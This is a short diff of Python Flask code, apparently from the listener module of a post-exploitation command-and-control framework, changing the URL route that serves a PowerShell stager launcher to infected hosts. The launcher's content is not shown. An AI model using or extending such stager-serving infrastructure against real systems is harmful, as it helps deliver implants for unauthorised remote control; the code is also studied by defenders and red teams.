@@ -801,13 +801,15 @@ def send_message(packets=None):
         self.app = app
 
 
-        @app.route('/<string:stagerURI>')
-        def send_stager(stagerURI):
-            if stagerURI:
+        @app.route('/download/<stager>')
+        def send_stager(stager):
+            if stager:
                 launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
                 return launcher
             else:
                 pass
+
+
         @app.before_request
         def check_ip():
             """
